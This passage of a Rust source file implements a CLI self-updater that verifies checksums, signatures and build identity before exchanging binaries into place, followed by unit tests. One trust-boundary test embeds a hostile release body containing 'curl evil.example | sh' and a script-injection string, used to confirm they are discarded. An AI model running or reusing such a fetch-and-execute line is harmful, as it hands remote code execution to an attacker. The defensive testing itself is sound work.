        &assets.archive.name,
    )
    .map_err(|why| anyhow::anyhow!("the checksum file is unusable: {why}"))?;
    if install::digest_of(&downloaded)? != expected {
        anyhow::bail!(
            "the download does not match its published checksum, so it was not installed"
        );
    }

    // Judged whole before a byte is unpacked — see `validate_members`.
    let members = install::list_members(&downloaded)?;
    crate::update_release::validate_members(&members, version, archive)
        .map_err(|why| anyhow::anyhow!("the archive is not one this can install: {why}"))?;

    // One directory per archive: both unpack to `codeconnect-<version>/`.
    let unpacked = work.join("unpacked").join(&assets.archive.name);
    install::extract(&downloaded, &unpacked)?;
    Ok(unpacked.join(format!("codeconnect-{version}")))
}

/// A fresh, empty staging directory.
fn fresh_staging(root: &std::path::Path) -> Result<std::path::PathBuf> {
    use crate::update_install as install;
    let staged = install::staging_dir(root);
    // Fail-closed. This directory is what gets exchanged into place, so
    // anything surviving in it from an earlier run would be installed as
    // though this run had verified it.
    install::remove_tree(&staged)?;
    std::fs::create_dir_all(&staged).context("creating the staging directory")?;
    Ok(staged)
}

/// Download CodeConnect's tmux for `version`, prove it, and stage it.
///
/// `required` is what the `codeconnect` it will run beside says `cc-tmux -V`
/// must print. The signature proves CodeConnect built it; the version line
/// proves it is the build this `codeconnect` was released with, not a
/// correctly signed tmux from some other release.
fn stage_tmux(
    assets: &crate::update_release::ReleaseAssets,
    version: &str,
    required: &str,
    work: &std::path::Path,
    staged: &std::path::Path,
    deps: &UpdateDeps,
) -> Result<()> {
    use crate::update_release::TMUX_BINARY;

    let from = fetch_and_unpack(assets, version, Archive::Tmux, work, deps)?;
    let candidate = from.join(TMUX_BINARY);
    (deps.verify_signature)(&candidate)?;
    crate::update_install::is_universal(&candidate)?;
    let reported = (deps.ask)(&candidate, "-V")?;
    if reported != required {
        anyhow::bail!(
            "{TMUX_BINARY} in the {version} release reports `{reported}`, but codeconnect \
             {version} requires `{required}`, so the release does not contain what it says"
        );
    }
    for file in Archive::Tmux.files() {
        std::fs::copy(from.join(file), staged.join(file))
            .with_context(|| format!("staging {file}"))?;
    }
    Ok(())
}

/// The commit point and its proof, shared by every installation: exchange the
/// staged set into place, run `check` against it where it now lives, and put
/// the previous set back if that fails.
fn exchange_and_prove(
    staged: &std::path::Path,
    live: &std::path::Path,
    version: &str,
    check: impl Fn() -> Result<()>,
) -> Result<()> {
    use crate::update_install as install;

    // The commit point. Before this line nothing on disk has moved.
    install::exchange(staged, live).context("installing the new binaries")?;

    // Proven where they will actually be run from, and rolled back as one if
    // any of them cannot run there.
    if let Err(why) = check() {
        match install::exchange(staged, live) {
            Ok(()) => anyhow::bail!("{why:#}, so the previous version was put back"),
            // Both the install and its undo failed. Saying "put back" here
            // would be the one thing worse than the failure itself: the user
            // needs to know exactly what is where.
            Err(undo) => anyhow::bail!(
                "{why:#} and the previous version could not be put back ({undo}). The new \
                 files are in {}, and the previous ones are in {}.",
                live.display(),
                staged.display()
            ),
        }
    }
    // The previous set, now that the new one has been proven where it runs.
    // Not fatal — the install is done and correct — but not silent either: the
    // next update refuses on a staging directory it cannot clear, so this is
    // the run that knows why.
    if let Err(why) = install::remove_tree(staged) {
        eprintln!(
            "codeconnect {version} is installed. The previous set could not be removed: {why:#}"
        );
        eprintln!(
            "it is in {}, and the next update will refuse until it can be cleared.",
            staged.display()
        );
    }
    Ok(())
}

/// The installed `cc-tmux` runs where it now lives and is `required`.
fn prove_tmux(live: &std::path::Path, required: &str, deps: &UpdateDeps) -> Result<()> {
    use crate::update_release::TMUX_BINARY;
    match (deps.ask)(&live.join(TMUX_BINARY), "-V") {
        Ok(said) if said == required => Ok(()),
        Ok(said) => anyhow::bail!("{TMUX_BINARY} reports `{said}` after installation"),
        Err(why) => anyhow::bail!("{TMUX_BINARY} did not run after installation ({why:#})"),
    }
}

/// Install only CodeConnect's tmux, from `version`'s release, beside the
/// binaries already installed. Everything else in `bin` is carried across
/// unchanged, and the daemon is left running: it finds `cc-tmux` the next
/// time it runs tmux.
fn install_tmux(
    body: &[u8],
    version: &str,
    required: &str,
    work: &std::path::Path,
    live: &std::path::Path,
    root: &std::path::Path,
    deps: &UpdateDeps,
) -> Result<()> {
    let assets =
        crate::update_release::select_assets(body, version, Archive::Tmux).map_err(|why| {
            anyhow::anyhow!("CodeConnect's tmux cannot be installed: {why}. Nothing was changed.")
        })?;
    let staged = fresh_staging(root)?;
    stage_tmux(&assets, version, required, work, &staged, deps)?;
    crate::update_install::carry_over_strangers(live, &staged, Archive::Tmux.files())?;
    crate::update_install::sync_tree(&staged)?;
    exchange_and_prove(&staged, live, version, || prove_tmux(live, required, deps))?;
    println!("CodeConnect's tmux ({required}) installed.");
    Ok(())
}

/// The download-verify-exchange half, so `run_update` reads as the sequence
/// it is. Every failure before the exchange leaves the installed set
/// untouched; a failed smoke test after it swaps the previous set back; a
/// failed restart keeps the new, proven set and says so.
fn install_release(
    core: &crate::update_release::ReleaseAssets,
    tmux: &crate::update_release::ReleaseAssets,
    version: &str,
    work: &std::path::Path,
    live: &std::path::Path,
    root: &std::path::Path,
    deps: &UpdateDeps,
) -> Result<()> {
    let from = fetch_and_unpack(core, version, Archive::Core, work, deps)?;
    install_set(&from, tmux, version, work, live, root, deps)
}

/// Install the release binaries in `from`, with the release's tmux, as one
/// set: each binary proven, all staged with whatever else `bin` holds,
/// exchanged into place in one step, proven where they now live, and the
/// managed daemon restarted onto them.
fn install_set(
    from: &std::path::Path,
    tmux: &crate::update_release::ReleaseAssets,
    version: &str,
    work: &std::path::Path,
    live: &std::path::Path,
    root: &std::path::Path,
    deps: &UpdateDeps,
) -> Result<()> {
    use crate::update_install as install;

    let staged = fresh_staging(root)?;

    // **One build across all three, not three binaries that agree on a
    // number.** A release is built from one commit; a set whose members name
    // different commits is not a release, however each one is signed.
    let mut common: Option<String> = None;
    for binary in crate::update_release::SHIPPED_BINARIES {
        let candidate = from.join(binary);
        (deps.verify_signature)(&candidate)?;
        install::is_universal(&candidate)?;
        let reported = (deps.probe_version)(&candidate)?;
        let Some(build) = install::reported_build(&reported, binary, version) else {
            anyhow::bail!(
                "{binary} in the {version} archive reports `{reported}`, so the release \
                 does not contain what it says it does"
            );
        };
        match &common {
            None => common = Some(build.to_string()),
            Some(seen) if seen == build => {}
            Some(seen) => anyhow::bail!(
                "the {version} archive mixes builds — {binary} was built from {build} and \
                 an earlier binary from {seen} — so it is not one release"
            ),
        }
        std::fs::copy(&candidate, staged.join(binary))
            .with_context(|| format!("staging {binary}"))?;
    }
    std::fs::copy(from.join("LICENSE"), staged.join("LICENSE"))
        .context("staging the licence that ships with the binaries")?;
    // The tmux this release requires is asked of this release's own
    // `codeconnect`, already proven to be CodeConnect's build of it.
    let required = (deps.ask)(&from.join("codeconnect"), "--tmux-version")?;
    stage_tmux(tmux, version, &required, work, &staged, deps)?;
    install::carry_over_strangers(live, &staged, &crate::update_release::SHIPPED_BINARIES)?;
    install::sync_tree(&staged)?;
    // A first install has no `bin` yet, and an exchange needs both sides.
    let first_install = !live.exists();
    std::fs::create_dir_all(live).context("creating the install directory")?;

    exchange_and_prove(&staged, live, version, || {
        for binary in crate::update_release::SHIPPED_BINARIES {
            if let Err(why) = (deps.probe_version)(&live.join(binary)) {
                anyhow::bail!("{binary} did not run after installation ({why:#})");
            }
        }
        prove_tmux(live, &required, deps)
    })?;

    // **After the smoke test, never before.** A daemon restarted onto binaries
    // that turn out not to run would take the product down; by here the new set
    // has been proven where it will actually be run from.
    //
    // A failed restart does not roll the binaries back. The new daemon may
    // already have started and touched state, and undoing an install underneath
    // it is a worse outcome than saying plainly what happened.
    match (deps.restart_daemon)() {
        Ok(true) => println!("the daemon was restarted; sessions survive it."),
        // Nothing installed here before, so no daemon of these binaries can be
        // running: there is nothing to say.
        Ok(false) if first_install => {}
        Ok(false) => {
            println!("no managed daemon to restart. If one is running, restart it to pick this up.")
        }
        Err(why) => {
            eprintln!("the new binaries are installed, but the daemon did not restart: {why:#}");
            eprintln!(
                "run `codeconnect daemon restart` once, and check `codeconnect daemon status`."
            );
            anyhow::bail!("the daemon did not restart");
        }
    }
    Ok(())
}

/// The newest published release.
fn fetch_latest_release() -> Result<Vec<u8>> {
    fetch_release("latest", "the latest release")
}

/// The release this binary was published in.
fn fetch_own_release() -> Result<Vec<u8>> {
    fetch_release(
        &format!("tags/v{}", env!("CARGO_PKG_VERSION")),
        &format!("release {}", env!("CARGO_PKG_VERSION")),
    )
}

/// A release listing, with failures that say what happened.
///
/// The background advisory deliberately collapses every network error into
/// silence, which is right for something nobody asked for. An update someone
/// typed is the opposite: it has to say why it could not do what it was told.
fn fetch_release(path: &str, what: &str) -> Result<Vec<u8>> {
    let output = std::process::Command::new("/usr/bin/curl")
        .args([
            "-q",
            "-fsS",
            "--proto",
            "=https",
            "--proto-redir",
            "=https",
            // A network that silently drops GitHub's traffic fails in seconds,
            // not after the whole budget: a session start waits on this.
            "--connect-timeout",
            "5",
            "--max-time",
            "20",
            "--max-filesize",
            "1048576",
            "-H",
            "Accept: application/vnd.github+json",
        ])
        .arg(format!(
            "https://api.github.com/repos/faisalmumtaz89/CodeConnect/releases/{path}"
        ))
        .stdin(std::process::Stdio::null())
        .output()
        .with_context(|| format!("asking GitHub for {what}"))?;
    if !output.status.success() {
        anyhow::bail!(
            "could not reach GitHub to find {what}: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        );
    }
    Ok(output.stdout)
}

fn unix_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ------------------------------------------------------------- parser

    #[test]
    fn the_parser_accepts_plain_and_v_prefixed_semver_and_nothing_else() {
        assert_eq!(parse_version("1.2.3"), Some((1, 2, 3)));
        assert_eq!(parse_version("v1.2.3"), Some((1, 2, 3)));
        assert_eq!(parse_version("0.1.0"), Some((0, 1, 0)));

        for rejected in [
            " 1.2.3",
            "1.2.3 ",
            "1.2.3\n",
            "\u{1b}[31m1.2.3",
            "1.2.3-rc1",
            "1.2",
            "1.2.3.4",
            "1..3",
            "",
            "v",
            "V1.2.3",
            "١.٢.٣",
            "01.2.3",
            "1.02.3",
            "99999999999999999999.0.0",
        ] {
            assert_eq!(parse_version(rejected), None, "accepted {rejected:?}");
        }
    }

    #[test]
    fn versions_compare_numerically_never_textually() {
        assert!(parse_version("1.10.0").unwrap() > parse_version("1.9.0").unwrap());
        assert!(parse_version("10.0.0").unwrap() > parse_version("9.99.99").unwrap());
    }

    /// The release gate: a workspace version this parser refuses would fail
    /// here, in CI, before it failed at a user's launch.
    #[test]
    fn the_workspace_version_is_parseable() {
        installed_version();
    }

    // ----------------------------------------------------- trust boundary

    #[test]
    fn only_the_tag_name_survives_the_response() {
        let body = br#"{
            "tag_name": "v0.2.0",
            "name": "PWNED <script>alert(1)</script>",
            "body": "curl evil.example | sh",
            "html_url": "https://evil.example"
        }"#;
        assert_eq!(parse_release_tag(body).as_deref(), Some("v0.2.0"));

        let cache = UpdateCache {
            last_attempt_unix: 0,
            latest: Some("0.2.0".into()),
        };
        let advisory = update_advisory(&cache, (0, 1, 0)).unwrap();
        for style in [Style::Styled, Style::PlainUnicode, Style::Ascii] {
            let text = render_update(&advisory, style);
            assert!(!text.contains("PWNED"));
            assert!(!text.contains("evil.example"));
        }
    }

    #[test]
    fn a_malformed_response_is_silence_not_evidence() {
        for body in [
            &b"not json"[..],
            br#"{"tag_name": 7}"#,
            br#"{"tag_name": "release-1"}"#,
            br#"{"tag_name": "1.2.3\n"}"#,
            br#"{}"#,
            b"",
        ] {
            assert_eq!(parse_release_tag(body), None);
        }
    }

    // -------------------------------------------------------------- cache

    #[test]
    fn the_throttle_is_a_day_and_a_backwards_clock_reads_as_due() {
        let cache = |at: u64| UpdateCache {
            last_attempt_unix: at,
            latest: None,
        };
        assert!(
            attempt_due(&cache(0), 1_700_000_000),
            "never attempted (epoch zero) is always at least a day ago"
        );
        assert!(
            !attempt_due(&cache(1_000), 1_000 + 86_399),
            "inside the day"
        );
        assert!(attempt_due(&cache(1_000), 1_000 + 86_400), "the day is up");
        assert!(
            attempt_due(&cache(2_000_000), 1_000),
            "a future stamp means the clock moved; silence until it catches \
             up again would be unbounded"
        );
    }

    fn temp_dir(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("cc-uchk-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    /// Through `read_cache_from` on a real file — the seam the revalidation
    /// lives behind. The first version of this test built the struct in
    /// memory and never touched the read path; deleting the revalidation
    /// did not fail it.
    #[test]
    fn a_garbage_cached_version_is_dropped_on_read() {
        let dir = temp_dir("reval");
        let path = dir.join("update-check.json");
        std::fs::write(
            &path,
            br#"{"last_attempt_unix":5,"latest":"not-a-version"}"#,
        )
        .unwrap();
        let cache = read_cache_from(&path);
        assert_eq!(cache.latest, None, "garbage must not survive the read");
        assert_eq!(
            cache.last_attempt_unix, 5,
            "the throttle stamp is untainted"
        );
        assert_eq!(update_advisory(&cache, (0, 1, 0)), None);
        std::fs::remove_dir_all(&dir).ok();
    }

    // ------------------------------------------------------------- update

    /// **Two updates cannot interleave.** Each stages into the same
    /// `bin.incoming` and finishes with a directory exchange; two of those
    /// overlapping could exchange the wrong set into place. The lock is a
    /// separate one from the advisory throttle because losing that one is
    /// harmless and losing this one is not.
    #[test]
    fn only_one_update_may_run_at_a_time() {
        let dir = temp_dir("update-lock");
        let lock = dir.join(".update.lock");

        let held = claim_throttle_at(&lock).expect("the first update claims it");
        assert!(
            claim_throttle_at(&lock).is_none(),
            "a second update must be refused while the first holds the lock"
        );
        drop(held);
        assert!(
            claim_throttle_at(&lock).is_some(),
            "and the lock is free again once the first finishes"
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    // ------------------------------------------------------------ checker

    /// The claim-before-fetch ordering, observed from inside the fetch: by
    /// the time the network runs, the attempt is already on disk, so a
    /// checker that dies mid-fetch has still throttled.
    #[test]
    fn the_attempt_is_claimed_before_the_fetch_runs() {
        let dir = temp_dir("claim");
        let cache_file = dir.join("update-check.json");
        let lock_file = dir.join(".update-check.lock");
        let seen = std::cell::Cell::new(0u64);
        run_checker_with(&cache_file, &lock_file, 1_700_000_000, || {
            seen.set(read_cache_from(&cache_file).last_attempt_unix);
            None
        })
        .unwrap();
        assert_eq!(
            seen.get(),
            1_700_000_000,
            "the fetch must find the attempt already persisted"
        );
        let after = read_cache_from(&cache_file);
        assert_eq!(after.latest, None, "a failed fetch adds no version");
        assert_eq!(after.last_attempt_unix, 1_700_000_000);
        std::fs::remove_dir_all(&dir).ok();
    }

    /// The lock is the kernel's cross-process atom: while one open file
    /// description holds it, a second claim loses without waiting.
    #[test]
    fn the_kernel_lock_admits_one_holder_and_frees_on_release() {
        let dir = temp_dir("lock");
        let cache_file = dir.join("update-check.json");
        let lock_file = dir.join(".update-check.lock");
        let now = 1_700_000_000u64;

        let claim = claim_throttle_at(&lock_file).expect("first claim wins");
        let mut fetched = false;
        run_checker_with(&cache_file, &lock_file, now, || {
            fetched = true;
            None
        })
        .unwrap();
        assert!(
            !fetched,
            "a held lock means another checker owns the window"
        );

        // Release — by drop here, by death anywhere — frees the next claim
        // against the same path immediately. No staleness protocol exists to
        // test, because no corpse can exist: the lock lives in the kernel,
        // not in the file, and dies with its holder. That property is what
        // deleted the publish/judge/break steps a file-content lock needed,
        // each of which carried a measured race.
        drop(claim);
        assert!(
            claim_throttle_at(&lock_file).is_some(),
            "release frees the next claimant; nothing to time out, nothing to break"
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    /// The claim outliving its drop is what the explicit unlock exists to
    /// prevent, and only a duplicate held past that drop can demonstrate it.
    /// The test above cannot: it meets one only if a sibling test happens to
    /// spawn at that moment, which nothing in it arranges. So this one holds
    /// the duplicate on purpose, until the parent has re-claimed (see
    /// [`crate::forked_holder`]); a regression guard that waits a fixed time
    /// is the flake it guards against.
    #[test]
    fn a_claim_that_a_child_inherited_is_still_released_by_the_drop() {
        let dir = temp_dir("inherit");
        let lock_file = dir.join(".update-check.lock");
        let claim = claim_throttle_at(&lock_file).expect("first claim wins");
        let child = crate::forked_holder::Release::new().fork_holder();
        drop(claim);
        let reclaimed = claim_throttle_at(&lock_file);
        assert!(
            child.release(std::time::Duration::from_secs(5)),
            "the child left when released"
        );
        assert!(
            reclaimed.is_some(),
            "a descriptor a child still holds must not keep the lock past the drop"
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    /// The child re-checks the throttle under the lock: the parent judged a
    /// cache another child may have advanced in the meantime.
    #[test]
    fn the_child_rechecks_the_throttle_under_the_lock() {
        let dir = temp_dir("recheck");
        let cache_file = dir.join("update-check.json");
        let lock_file = dir.join(".update-check.lock");
        let now = 1_700_000_000u64;
        std::fs::write(
            &cache_file,
            format!(r#"{{"last_attempt_unix":{},"latest":null}}"#, now - 60),
        )
        .unwrap();
        let mut fetched = false;
        run_checker_with(&cache_file, &lock_file, now, || {
            fetched = true;
            None
        })
        .unwrap();
        assert!(!fetched, "another child attempted a minute ago; not due");
        std::fs::remove_dir_all(&dir).ok();
    }

    // ------------------------------------------------------------- notice

    fn advisory() -> UpdateAdvisory {
        UpdateAdvisory {
            installed: (0, 1, 0),
            latest: "0.2.0".into(),
        }
    }

    /// The exact styled payload, byte for byte: bold on the headline and on
    /// the lone command, typographic separators, nothing else.
    #[test]
    fn the_styled_rendering_is_exact() {
        assert_eq!(
            render_update(&advisory(), Style::Styled),
            "\u{1b}[1mCodeConnect update available\u{1b}[0m \u{b7} 0.1.0 \u{2192} 0.2.0\n\n\
             \u{1b}[1mcodeconnect update\u{1b}[0m"
        );
    }

    /// `NO_COLOR` kills every escape — bold included — and touches nothing
    /// typographic.
    #[test]
    fn no_color_keeps_the_typography_and_drops_all_sgr() {
        let text = render_update(&advisory(), Style::PlainUnicode);
        assert_eq!(
            text,
            "CodeConnect update available \u{b7} 0.1.0 \u{2192} 0.2.0\n\ncodeconnect update"
        );
        assert!(!text.contains('\u{1b}'));
    }

    /// Logs, pipes and dumb terminals get pure ASCII: no escapes, no
    /// multi-byte characters, no trailing spaces, everything under 80 cols.
    #[test]
    fn the_ascii_rendering_is_pure_ascii() {
        let text = render_update(&advisory(), Style::Ascii);
        assert_eq!(
            text,
            "CodeConnect update available: 0.1.0 -> 0.2.0\n\ncodeconnect update"
        );
        assert!(text.is_ascii());
        for line in text.lines() {
            assert!(line.len() < 80);
            assert_eq!(line, line.trim_end());
        }
    }

    /// The one styling decision: not-a-TTY or `TERM=dumb` forces ASCII;
    /// `NO_COLOR` — present even when empty — strips SGR but keeps the TTY
    /// typography; otherwise styled.
    #[test]
    fn styling_is_decided_by_the_three_documented_signals() {
        assert_eq!(
            style_for(false, Some("xterm-256color"), false),
            Style::Ascii
        );
        assert_eq!(style_for(true, Some("dumb"), false), Style::Ascii);
        assert_eq!(style_for(true, Some("dumb"), true), Style::Ascii);
        assert_eq!(
            style_for(true, Some("xterm-256color"), true),
            Style::PlainUnicode
        );
        assert_eq!(style_for(true, None, true), Style::PlainUnicode);
        assert_eq!(
            style_for(true, Some("xterm-256color"), false),
            Style::Styled
        );
    }

    /// The countdown speaks whole seconds, `10` first, never `0`, each
    /// frame erasing the last; the deadline is monotonic elapsed time, so a
    /// delayed tick shows the true remainder instead of replaying numbers.
    #[test]
    fn the_countdown_counts_real_time_down_and_never_says_zero() {
        assert_eq!(
            countdown_frame(10),
            "\r\u{1b}[2KContinuing in 10s\u{2026} Press Return to continue now."
        );

        let mut out: Vec<u8> = Vec::new();
        // A fake clock: the first frame reads zero elapsed — "display 10
        // immediately" — and every later observation has jumped three
        // seconds. Elapsed time rules, so frames skip numbers (10, 7, 4, 1)
        // rather than replaying the ones the delay swallowed.
        let start = std::time::Instant::now();
        let mut observations = 0u64;
        hold_for_reading(
            std::time::Duration::from_secs(10),
            |_| false,
            &mut out,
            move || {
                let elapsed = observations.saturating_sub(1) * 3;
                observations += 1;
                start + std::time::Duration::from_secs(elapsed)
            },
        );
        let text = String::from_utf8(out).unwrap();
        assert!(text.starts_with("\r\u{1b}[2KContinuing in 10s"));
        assert!(text.contains("in 7s"), "a 3s-late tick shows the remainder");
        assert!(!text.contains("in 0s"), "zero is never shown");
        assert!(
            text.ends_with(COUNTDOWN_CLEAR),
            "the line is erased before attach"
        );
    }

    /// Return — or stdin closing — ends the hold at once, with the line
    /// cleared; the ten seconds are never served blind.
    #[test]
    fn return_or_eof_ends_the_hold_immediately() {
        let mut out: Vec<u8> = Vec::new();
        let begun = std::time::Instant::now();
        hold_for_reading(
            std::time::Duration::from_secs(10),
            |_| true,
            &mut out,
            std::time::Instant::now,
        );
        assert!(begun.elapsed() < std::time::Duration::from_secs(2));
        assert!(String::from_utf8(out).unwrap().ends_with(COUNTDOWN_CLEAR));
    }

    /// The exhaustive styling truth table — every combination of the three
    /// signals — plus the real environment adapter driven with an injected
    /// lookup, including the convention's sharpest edge: an *empty*
    /// `NO_COLOR` still counts as present.
    #[test]
    fn every_styling_combination_lands_where_the_conventions_say() {
        for tty in [true, false] {
            for term in [Some("dumb"), Some("xterm-256color"), None] {
                for no_color in [true, false] {
                    let expected = if !tty || term == Some("dumb") {
                        Style::Ascii
                    } else if no_color {
                        Style::PlainUnicode
                    } else {
                        Style::Styled
                    };
                    assert_eq!(style_for(tty, term, no_color), expected);
                }
            }
        }

        let env = |vars: &'static [(&'static str, &'static str)]| {
            move |name: &str| -> Option<std::ffi::OsString> {
                vars.iter()
                    .find(|(key, _)| *key == name)
                    .map(|(_, value)| std::ffi::OsString::from(value))
            }
        };
        assert_eq!(
            style_from_env(true, env(&[("TERM", "xterm"), ("NO_COLOR", "")])),
            Style::PlainUnicode,
            "empty NO_COLOR is still NO_COLOR"
        );
        assert_eq!(style_from_env(true, env(&[("TERM", "dumb")])), Style::Ascii);
        assert_eq!(
            style_from_env(true, env(&[("TERM", "xterm")])),
            Style::Styled
        );
        assert_eq!(style_from_env(false, env(&[])), Style::Ascii);
    }

    /// The full countdown transcript under a 3s-per-tick clock, byte for
    /// byte, with exactly one flush per frame plus one for the clear — no
    /// buffered frame can lag the second it names.
    #[test]
    fn the_countdown_transcript_and_flush_discipline_are_exact() {
        struct CountingSink {
            bytes: Vec<u8>,
            flushes: usize,
        }
        impl std::io::Write for CountingSink {
            fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
                self.bytes.extend_from_slice(buf);
                Ok(buf.len())
            }
            fn flush(&mut self) -> std::io::Result<()> {
                self.flushes += 1;
                Ok(())
            }
        }
        let mut sink = CountingSink {
            bytes: Vec::new(),
            flushes: 0,
        };
        let start = std::time::Instant::now();
        let mut observations = 0u64;
        hold_for_reading(
            std::time::Duration::from_secs(10),
            |_| false,
            &mut sink,
            move || {
                let elapsed = observations.saturating_sub(1) * 3;
                observations += 1;
                start + std::time::Duration::from_secs(elapsed)
            },
        );
        let expected: String = [10u64, 7, 4, 1]
            .iter()
            .map(|n| countdown_frame(*n))
            .collect::<String>()
            + COUNTDOWN_CLEAR;
        assert_eq!(String::from_utf8(sink.bytes).unwrap(), expected);
        assert_eq!(sink.flushes, 5, "four frames and the clear, each flushed");
    }

    /// The *real* wait, on a real descriptor: a Return line and EOF each end
    /// the hold at once, and a hold that runs out leaves **nothing** reading —
    /// what is typed afterwards is still there for the attach that follows.
    #[test]
    fn the_wait_signals_on_return_and_eof_and_leaves_no_reader_behind() {
        use std::io::{Read, Write};
        use std::os::fd::AsRawFd;
        let pipe = || {
            let mut fds = [0; 2];
            assert_eq!(unsafe { libc::pipe(fds.as_mut_ptr()) }, 0);
            use std::os::fd::FromRawFd;
            unsafe {
                (
                    std::fs::File::from_raw_fd(fds[0]),
                    std::fs::File::from_raw_fd(fds[1]),
                )
            }
        };
        let (read, mut write) = pipe();
        write.write_all(b"\n").unwrap();
        assert!(returned_within(
            read.as_raw_fd(),
            std::time::Duration::from_secs(5)
        ));
        let (read, write) = pipe();
        drop(write);
        assert!(returned_within(
            read.as_raw_fd(),
            std::time::Duration::from_secs(5)
        ));

        let (mut read, mut write) = pipe();
        let begun = std::time::Instant::now();
        hold_for_reading(
            std::time::Duration::from_secs(1),
            |wait| returned_within(read.as_raw_fd(), wait),
            &mut Vec::new(),
            std::time::Instant::now,
        );
        assert!(begun.elapsed() >= std::time::Duration::from_secs(1));
        write.write_all(b"typed after the hold").unwrap();
        drop(write);
        let mut after = Vec::new();
        read.read_to_end(&mut after).unwrap();
        assert_eq!(after, b"typed after the hold");
    }

    /// What is typed during the hold belongs to the session: a lone Return answers
    /// "Press Return to continue now" and is taken, but a typed line ends the hold
    /// and stays in the terminal for the attach to pass on, as the agent run
    /// directly would have read it.
    #[test]
    fn a_line_typed_during_the_hold_ends_it_and_stays_for_the_session() {
        let (mut main, mut side) = (-1, -1);
        let opened = unsafe {
            libc::openpty(
                &mut main,
                &mut side,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            )
        };
        assert_eq!(opened, 0, "openpty");
        let type_in = |bytes: &[u8]| {
            let written = unsafe { libc::write(main, bytes.as_ptr().cast(), bytes.len()) };
            assert_eq!(written, bytes.len() as isize);
        };
        let waiting = || {
            let mut pending: libc::c_int = 0;
            assert_eq!(
                unsafe { libc::ioctl(side, libc::FIONREAD, &mut pending) },
                0
            );
            pending
        };

        type_in(b"\r");
        assert!(returned_within(side, std::time::Duration::from_secs(5)));
        assert_eq!(waiting(), 0, "the lone Return is the hold's, and taken");

        type_in(b"hello\r");
        assert!(returned_within(side, std::time::Duration::from_secs(5)));
        assert_eq!(waiting(), 6, "the typed line is left");
        let mut line = [0u8; 16];
        let read = unsafe { libc::read(side, line.as_mut_ptr().cast(), line.len()) };
        assert_eq!(
            &line[..read.max(0) as usize],
            b"hello\n",
            "the typed line is left"
        );
        unsafe {
            libc::close(main);
            libc::close(side);
        }
    }

    /// `daemon status` renders for stdout's own signals and never counts
    /// down — the block cannot contain the countdown sentence by
    /// construction, and this pins it.
    #[test]
    fn the_status_block_styles_for_stdout_and_never_counts_down() {
        let advisory = advisory();
        let styled = status_update_block(&advisory, true, Some("xterm"), false);
        assert!(styled.contains("\u{1b}[1m"));
        let piped = status_update_block(&advisory, false, Some("xterm"), false);
        assert!(piped.is_ascii());
        for text in [styled, piped] {
            assert!(!text.contains("Continuing in"), "status never holds anyone");
        }
    }

    /// The boundary races, pinned: a wake 1ms *before* a whole second
    /// recomputes the same number and must write nothing; landing exactly
    /// on the boundary, and 1ms after it, each produce their frame exactly
    /// once. Frame identity is the number, not the timer.
    #[test]
    fn boundary_jitter_never_doubles_a_frame() {
        struct CountingSink {
            bytes: Vec<u8>,
            flushes: usize,
        }
        impl std::io::Write for CountingSink {
            fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
                self.bytes.extend_from_slice(buf);
                Ok(buf.len())
            }
            fn flush(&mut self) -> std::io::Result<()> {
                self.flushes += 1;
                Ok(())
            }
        }
        let mut sink = CountingSink {
            bytes: Vec::new(),
            flushes: 0,
        };
        // Observations, in seconds: the early wake (0.999), the exact
        // boundary (1.0), a late wake (2.001), then out.
        let offsets = [0.0, 0.0, 0.999, 1.0, 2.001, 10.0];
        let start = std::time::Instant::now();
        let mut calls = 0usize;
        hold_for_reading(
            std::time::Duration::from_secs(10),
            |_| false,
            &mut sink,
            move || {
                let offset = offsets[calls.min(offsets.len() - 1)];
                calls += 1;
                start + std::time::Duration::from_secs_f64(offset)
            },
        );
        let expected: String = [10u64, 9, 8]
            .iter()
            .map(|n| countdown_frame(*n))
            .collect::<String>()
            + COUNTDOWN_CLEAR;
        assert_eq!(
            String::from_utf8(sink.bytes).unwrap(),
            expected,
            "10 once (early wake writes nothing), 9 at the boundary, 8 after"
        );
        assert_eq!(sink.flushes, 4, "three frames and the clear");
    }

    #[test]
    fn equal_and_older_releases_stay_silent() {
        let cache = |latest: &str| UpdateCache {
            last_attempt_unix: 0,
            latest: Some(latest.into()),
        };
        assert_eq!(
            update_advisory(&cache("0.1.0"), (0, 1, 0)),
            None,
            "equal is current"
        );
        assert_eq!(
            update_advisory(&cache("0.0.9"), (0, 1, 0)),
            None,
            "older is not news"
        );
        assert!(update_advisory(&cache("0.1.1"), (0, 1, 0)).is_some());
        assert_eq!(
            update_advisory(&UpdateCache::default(), (0, 1, 0)),
            None,
            "no validated answer, no claim"
        );
    }

    /// The downgrade every other check in the updater would walk straight
    /// through: an older release is genuine, correctly signed, and correctly
    /// checksummed.
    #[test]
    fn an_older_release_is_refused_and_the_same_one_is_a_repair() {
        assert!(may_install("0.5.0", "0.4.0").is_ok(), "newer installs");
        assert!(
            may_install("0.4.0", "0.4.0").is_ok(),
            "the same version is the repair path for a mismatched set"
        );

        let refused = may_install("0.3.0", "0.4.0").expect_err("older must be refused");
        assert!(
            refused.contains("0.3.0") && refused.contains("0.4.0"),
            "the refusal has to name both versions: {refused}"
        );

        assert!(
            may_install("0.9.0", "0.10.0").is_err(),
            "ordered by value — as text, `0.10.0` sorts before `0.9.0`"
        );
        assert!(
            may_install("not-a-version", "0.4.0").is_err(),
            "anything that cannot be ordered is refused, never compared as text"
        );
        assert!(may_install("0.5.0", "build unknown").is_err());
    }

    // ---------------------------------------------------- the whole update
    //
    // `run_update_at` against a real filesystem: real checksum arithmetic,
    // real archives built with the system `tar`, real Mach-O headers, real
    // staging and a real directory exchange. Only the five seams in
    // `UpdateDeps` are injected — the network cannot be reached from a test
    // and a Developer ID signature cannot be produced by one, so what these
    // tests prove is that the judgments cannot be skipped, reordered, or
    // applied to the wrong files. The judgments themselves have their own
    // tests.

    use std::cell::RefCell;
    use std::collections::BTreeMap;

